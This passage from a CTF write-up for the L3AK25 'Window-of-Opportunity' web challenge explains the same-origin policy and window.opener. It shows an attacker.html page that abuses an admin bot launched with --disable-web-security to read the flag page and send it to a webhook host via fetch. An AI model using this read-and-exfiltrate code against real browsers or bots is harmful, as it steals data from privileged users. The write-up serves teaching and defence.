</span></span><span class=line><span class=cl>    <span class=nx>csrfToken</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>csrf_token</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>csrfToken</span> <span class=o>&amp;&amp;</span> <span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>.</span><span class=nx>csrf_token</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>csrfToken</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>.</span><span class=nx>csrf_token</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>validateCSRFToken</span><span class=p>(</span><span class=nx>csrfToken</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>403</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span>
</span></span><span class=line><span class=cl>      <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;CSRF token validation failed&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>message</span><span class=o>:</span> <span class=s1>&#39;Invalid, missing, or expired CSRF token&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>csrfTokens</span><span class=p>.</span><span class=k>delete</span><span class=p>(</span><span class=nx>csrfToken</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nx>next</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This middleware performs the following:</p><ul><li>Origin checking (only accepts specific origins).</li><li>Token validation (looks for a token in headers, body, or query params).</li><li>Timestamp checking (must be recent, within 5 minutes).</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>function</span> <span class=nx>validateCSRFToken</span><span class=p>(</span><span class=nx>token</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>token</span> <span class=o>||</span> <span class=o>!</span><span class=nx>csrfTokens</span><span class=p>.</span><span class=nx>has</span><span class=p>(</span><span class=nx>token</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>timestamp</span> <span class=o>=</span> <span class=nx>csrfTokens</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>token</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>fiveMinutesAgo</span> <span class=o>=</span> <span class=nb>Date</span><span class=p>.</span><span class=nx>now</span><span class=p>()</span> <span class=o>-</span> <span class=p>(</span><span class=mi>5</span> <span class=o>*</span> <span class=mi>60</span> <span class=o>*</span> <span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>timestamp</span> <span class=o>&lt;</span> <span class=nx>fiveMinutesAgo</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>csrfTokens</span><span class=p>.</span><span class=k>delete</span><span class=p>(</span><span class=nx>token</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Seems stronK huh!? We can&rsquo;t easily spoof the Origin header, and even if can drop
it, the check for its existence forbids us from doing anything further.</p><p>This leaves no option for hosting our own page and ourselves interacting with the server.
The attack should be done from within, i.e. the admin, typical CSRF goal, but how can we achieve it?</p><h2 id=task-analysis>Task Analysis<a hidden class=anchor aria-hidden=true href=#task-analysis>#</a></h2><p>Digging deeper into the codebase, we hit the admin bot logic.</p><p>One line in particular stands out to me:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>args</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;--disable-web-security&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>];</span>
</span></span></code></pre></div><p>This flag is passed to Puppeteer during browser initialization:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>browser</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>puppeteer</span><span class=p>.</span><span class=nx>launch</span><span class=p>({</span> <span class=nx>headless</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span> <span class=nx>args</span> <span class=p>});</span>
</span></span></code></pre></div><p><img alt="&ndash;disable-web-security flag" loading=lazy src=/blog/images/2025-07-16-16-48-41.png></p><p>This flag is normally meant for developers doing local testing and is not safe for anything else. But in CTF land? It’s a golden ticket.</p><p>Let’s keep that in mind while we scroll down to how our input (the attacker URL) is processed:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>evaluate</span><span class=p>((</span><span class=nx>targetUrl</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=nx>targetUrl</span><span class=p>,</span> <span class=s2>&#34;_blank&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>},</span> <span class=nx>url</span><span class=p>);</span>
</span></span></code></pre></div><p>Not using page.goto, but instead window.open(), mhmm.. Could this be important?</p><p>Those two, I must add, key observations hinted at something to do with SOP in relation
to opening windows, and since the web follows the composability principle, i.e. websites
interacting with each other. I was wondering how browsers keeps them safe from one another,
and whether this configuration might lead to vulnerabilities. Let&rsquo;s see~</p><blockquote><p>If you already know how the browsers apply the same origin policy, feel free to skip to the exploitation phase.</p></blockquote><h3 id=the-web-origin-concept>The Web Origin Concept<a hidden class=anchor aria-hidden=true href=#the-web-origin-concept>#</a></h3><p>User agents interact with different resources in the web. Those resources are served
to the client for consumption and the latter might have confidential information
the user agent does NOT want to disclose to other websites.</p><p>From here, the concept of an origin comes out. In general, websites of the same origin
are free to interact with each other, but <em>cross-origin</em> interaction is limited by the user agent in
hopes that a malicious website doesn&rsquo;t mess with the confidentiality or integrity of data of another (honest) website.</p><p>Having said that, we have to define what an origin is, as well as the principles of the same-origin policy.</p><blockquote><p>Some principles are application specific, the HTML spec being one example defining its
own policy that follows the general principles laid out.</p></blockquote><h4 id=1-trust>1. Trust:<a hidden class=anchor aria-hidden=true href=#1-trust>#</a></h4><p>user agents primarily perform two types of actions with remote servers:</p><ul><li>The 1st is fetching data.</li><li>The 2nd is sending data.</li></ul><p>Whether a trust relationship is established or not should be done using URIs, for
example fetching data from <a href=http://example.com>http://example.com</a> while in <a href=http://evil.com>http://evil.com</a>, the browser
should compare the two URIs and dedice whether it trusts the other to do the action.</p><h4 id=2-origin>2. Origin:<a hidden class=anchor aria-hidden=true href=#2-origin>#</a></h4><p>In principle, user agents could treat every URI as a different protection
domain, but that would be cumbersome for developers, because by default, <a href=http://example.com>http://example.com</a>
and <a href=http://example.com/login>http://example.com/login</a> should interact freely. For this, two URIs are of the same
origin if they have the same scheme, host and port. This way, user agents <strong>group</strong>
origins under the same protection domain.</p><p>But does every resource in an origin group have the same authority?</p><h4 id=3-authority>3. Authority:<a hidden class=anchor aria-hidden=true href=#3-authority>#</a></h4><p>Here comes the third principle of authority, even though we share the
same house (the origin), I, the owner (usually the html document) can do more stuff
than you (a passive observer, usually img tags). This concept limits what resources
can access in what domains. User agents apply this using media types so when user controlled
content is thrown into an app, developers set their media type into image/png (if the content
is an image), disallowing access to DOM APIs that could inflict damage.</p><h4 id=4-policy>4. Policy:<a hidden class=anchor aria-hidden=true href=#4-policy>#</a></h4><p>Generally speaking, and based on what&rsquo;s said above, user agents isolate
origins and permit controlled communication between them. This controlled communication
depends on several factors:</p><ul><li><ul><li><strong>Object access:</strong> most objects (or APIs) are only accessed on the same origin, with
the exception of HTML&rsquo;s location interface (navigating other tabs), and
the postmessage interface that allows the sending of data across origins.</li><li><strong>Network access:</strong> reading information from other origins is forbidden, unless
cors is enabled (which in our case it isn&rsquo;t). However, sending information to another origin is permitted.</li></ul></li></ul><p>While sending is permitted across origins, using arbitrary formats is dangerous,
thus browsers only allow the sending of data without custom headers (this proves the points
made above about our inability to spoof the Origin header)</p><p><strong>To recap:</strong> User agents serve different resources to us users. Those resources are grouped
into origins, where interaction is free in same-origin, and controlled across origins.</p><hr><p>This should make it clear that trying to READ the flag from our own malicious website
isn&rsquo;t feasible as it is, and trying to edit or craft custom headers to bypass the app protection
isn&rsquo;t feasible as well. So our only hope is navigating the admin <em>(making sure you remember)</em>
to get the flag, and somehow get the response from him. Let&rsquo;s check the navigation logic.</p><h3 id=the-window-interface>The Window interface<a hidden class=anchor aria-hidden=true href=#the-window-interface>#</a></h3><p>When you launch your browser, you&rsquo;re given a tab in which you put a url and navigate to it (wow, I bet you didn&rsquo;t know that). On navigation, the browser
sends a request to the server, the server usually responds with HTML and a document
is created. This document is a javascript object that allows you to control the page
by exposing different interfaces. One of these is the <code>Window</code> interface.</p><div style="padding:1rem;margin:1rem 0;border-left:4px solid;border-radius:.5rem;background-color:#1e293b;border-color:#38bdf8;color:#e5e7eb;font-size:.95rem;line-height:1.5;font-family:system-ui,sans-serif">The Window interface represents a window containing a DOM document.</div><p>You can use this interface to get the name of your tab (each tab is associated with a window object),
get the current origin and even set the current url to a different web page,
achieving the same effect as visually typing another url and hitting ENTER.</p><p>According to the spec, when websites opens a url using window.open(), the opened window
gets a reference to the <em><strong>opener</strong></em> window. In other words, if window A opens window B, B.opener returns A.</p><p>This is helpful because navigation of the opener window is possible, which means that
the opened page can open a URL in the original tab or window NOT worrying about CSRF,
because it&rsquo;s the same origin!</p><p><img alt="showcasing window relations" loading=lazy src=/blog/images/l3ak25/window-of-opp-opener.gif></p><p>So we can navigate the admin to <code>/get_flag</code>, but could we read the response?</p><h3 id=revisiting---disable-web-security-flag>Revisiting <code>--disable-web-security</code> Flag<a hidden class=anchor aria-hidden=true href=#revisiting---disable-web-security-flag>#</a></h3><p>normally, Windows opened by links with a target of <code>_blank</code> don&rsquo;t get a reference to the opener,
unless explicitly requested with <code>rel=opener</code>.</p><p>This is part of SOP. It makes sense that browsers do that by default. However,
this challenge is not the usual, Using the <code>--disable-web-security</code> flag doesn&rsquo;t enforce the same-origin policy.
It&rsquo;s meant for testing purposes only and should have no effects unless <code>--user-data-dir</code> is also present.</p><p>Luckily for us, we have <strong>all</strong> the effects we need.</p><h2 id=exploitaiton>Exploitaiton<a hidden class=anchor aria-hidden=true href=#exploitaiton>#</a></h2><p>Armed with this knowledge, we can exfiltrate the flag by hosting a malicious <code>attacker.html</code>
page where:</p><ol><li>We navigate the opener window that belongs to the admin to get the flag:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nb>window</span><span class=p>.</span><span class=nx>opener</span><span class=p>.</span><span class=nx>location</span> <span class=o>=</span> <span class=s2>&#34;http://challenge/get_flag&#34;</span><span class=p>;</span>
</span></span></code></pre></div><ol start=2><li><p>Wait some time for the flag to load.</p></li><li><p>Grab the flag and send it to our server:</p></li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>flagText</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>opener</span><span class=p>.</span><span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>innerText</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;https://webhook/?flag=&#34;</span><span class=o>+</span><span class=nx>flagText</span><span class=p>);</span>
</span></span></code></pre></div><blockquote><p><code>window.opener.document.body.innerText</code> throws a DOMException unless origins match or SOP is disabled
(which is our case with the &ndash;disable-web-security flag), so read is possible</p></blockquote><p>Putting everything together, we get the following</p><h3 id=attackerhtml><code>attacker.html</code><a hidden class=anchor aria-hidden=true href=#attackerhtml>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=c1>// Redirect the original admin tab to /get_flag
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=nb>window</span><span class=p>.</span><span class=nx>opener</span><span class=p>.</span><span class=nx>location</span> <span class=o>=</span> <span class=s2>&#34;http://challenge/get_flag&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=c1>// Wait for admin&#39;s tab to load, then steal the flag
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=nx>setTimeout</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=kr>const</span> <span class=nx>flagText</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>opener</span><span class=p>.</span><span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>innerText</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>          <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;https://webhook/?flag=&#34;</span><span class=o>+</span><span class=nx>flagText</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=s2>&#34;Failed to read flag:&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=p>},</span> <span class=mi>400</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>The code adheres to this visual representation of the attack:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Admin bot
</span></span><span class=line><span class=cl>   ↓ opens attacker.html
</span></span><span class=line><span class=cl>Attacker tab
</span></span><span class=line><span class=cl>   → window.opener.location <span class=o>=</span> /get_flag
</span></span><span class=line><span class=cl>   → waits...
</span></span><span class=line><span class=cl>   → reads window.opener.document.body.innerText
</span></span><span class=line><span class=cl>   → fetch<span class=o>(</span><span class=s1>&#39;https://webhook.site?flag=...&#39;</span><span class=o>)</span>
</span></span></code></pre></div><p>We host the webpage and deliver the attack</p><p><img alt=exploit loading=lazy src=/blog/images/l3ak25/window-of-opp-exploit.gif></p><p>And Boom~</p><p><img alt="celebration hackah~" loading=lazy src=https://media1.tenor.com/m/qJ_EjDNHqcUAAAAC/usuwam-rajd-hakowanie.gif></p><p>Here is the flag: <code>L3AK{T1gh7_CSRF_y3t_w1nd0w_0p3n3r_w1n5!}</code></p><h2 id=conclusions>Conclusions<a hidden class=anchor aria-hidden=true href=#conclusions>#</a></h2><ul><li>Same-Origin Policy (SOP) is a fundamental browser defense preventing cross-origin reads and DOM access.</li><li>Browsers use origin tuples (scheme, host, port) to enforce this boundary.</li><li><code>window.opener</code> can be dangerous if the opened page is malicious and SOP is relaxed.</li><li>The Chrome flag <code>--disable-web-security</code> completely disables SOP and CORS, making browser automation insecure by default.</li><li>This challenge demonstrates how opener-based attacks can completely subvert origin boundaries in such an environment.</li><li>CSRF protection alone is <strong>not enough</strong> when the browser itself disables security constraints.</li></ul><h2 id=references>References<a hidden class=anchor aria-hidden=true href=#references>#</a></h2><h3 id=same-origin-policy--browser-security><strong>Same-Origin Policy & Browser Security</strong><a hidden class=anchor aria-hidden=true href=#same-origin-policy--browser-security>#</a></h3><ol><li><strong><a href=https://datatracker.ietf.org/doc/html/rfc6454>RFC 6454 – The Web Origin Concept (IETF)</a></strong></li><li><strong><a href=https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy>MDN – Same-Origin Policy Overview</a></strong></li><li><strong><a href=https://portswigger.net/web-security/cors/same-origin-policy>PortSwigger – Same-Origin Policy</a></strong></li><li><strong><a href=https://web.archive.org/web/20170717163022/https://www.w3.org/Security/wiki/Same_Origin_Policy>W3C Wiki – Same-Origin Policy (Archived)</a></strong></li><li><strong><a href=https://peter.sh/experiments/chromium-command-line-switches/#disable-web-security>Peter Beverloo’s Chrome Switches – <code>--disable-web-security</code></a></strong></li></ol><h3 id=cross-site-request-forgery-csrf><strong>Cross-Site Request Forgery (CSRF)</strong><a hidden class=anchor aria-hidden=true href=#cross-site-request-forgery-csrf>#</a></h3><ol start=7><li><strong><a href=https://portswigger.net/web-security/csrf>PortSwigger – CSRF Overview</a></strong></li><li><strong><a href=https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses>PortSwigger – Bypassing Referer-Based CSRF Defenses</a></strong></li></ol><h3 id=cookies-metadata-and-headers><strong>Cookies, Metadata, and Headers</strong><a hidden class=anchor aria-hidden=true href=#cookies-metadata-and-headers>#</a></h3><ol start=9><li><strong><a href=https://web.dev/articles/samesite-cookies-explained>web.dev – SameSite Cookies Explained</a></strong></li><li><strong><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers#fetch_metadata_request_headers>MDN – Fetch Metadata Request Headers</a></strong></li><li><strong><a href=https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html#fetch-metadata-sec-fetch-dest>OWASP – XS-Leaks Cheat Sheet (Fetch Metadata)</a></strong></li></ol><h3 id=browser-apis-and-developer-guidance><strong>Browser APIs and Developer Guidance</strong><a hidden class=anchor aria-hidden=true href=#browser-apis-and-developer-guidance>#</a></h3><ol start=12><li><strong><a href=https://developer.mozilla.org/en-US/docs/Web/API/Window>MDN – <code>Window</code> Interface</a></strong></li><li><strong><a href=https://developer.mozilla.org/en-US/docs/Web/API/Document/body>MDN – <code>document.body</code></a></strong></li><li><strong><a href=https://developer.chrome.com/docs/lighthouse/best-practices/external-anchors-use-rel-noopener>Chrome Developers – <code>rel=noopener</code> Best Practice</a></strong></li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://hxuu.github.io/blog/tags/ctf/>Ctf</a></li><li><a href=https://hxuu.github.io/blog/tags/write-up/>Write-Up</a></li><li><a href=https://hxuu.github.io/blog/tags/l3ak/>L3ak</a></li></ul><nav class=paginav><a class=next href=https://hxuu.github.io/blog/ctf/l3ak25/notorious-note/><span class=title>Next »</span><br><span>L3AK25: Writeup for Web/Notorious-Note</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share L3AK25: Writeup for Web/Window-of-Opportunity on x" href="https://x.com/intent/tweet/?text=L3AK25%3a%20Writeup%20for%20Web%2fWindow-of-Opportunity&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fl3ak25%2fwindow-of-opportunity%2f&amp;hashtags=ctf%2cwrite-up%2cl3ak"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share L3AK25: Writeup for Web/Window-of-Opportunity on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fl3ak25%2fwindow-of-opportunity%2f&amp;title=L3AK25%3a%20Writeup%20for%20Web%2fWindow-of-Opportunity&amp;summary=L3AK25%3a%20Writeup%20for%20Web%2fWindow-of-Opportunity&amp;source=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fl3ak25%2fwindow-of-opportunity%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share L3AK25: Writeup for Web/Window-of-Opportunity on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fl3ak25%2fwindow-of-opportunity%2f&title=L3AK25%3a%20Writeup%20for%20Web%2fWindow-of-Opportunity"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share L3AK25: Writeup for Web/Window-of-Opportunity on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fl3ak25%2fwindow-of-opportunity%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share L3AK25: Writeup for Web/Window-of-Opportunity on whatsapp" href="https://api.whatsapp.com/send?text=L3AK25%3a%20Writeup%20for%20Web%2fWindow-of-Opportunity%20-%20https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fl3ak25%2fwindow-of-opportunity%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share L3AK25: Writeup for Web/Window-of-Opportunity on telegram" href="https://telegram.me/share/url?text=L3AK25%3a%20Writeup%20for%20Web%2fWindow-of-Opportunity&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fl3ak25%2fwindow-of-opportunity%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share L3AK25: Writeup for Web/Window-of-Opportunity on ycombinator" href="https://news.ycombinator.com/submitlink?t=L3AK25%3a%20Writeup%20for%20Web%2fWindow-of-Opportunity&u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fl3ak25%2fwindow-of-opportunity%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" 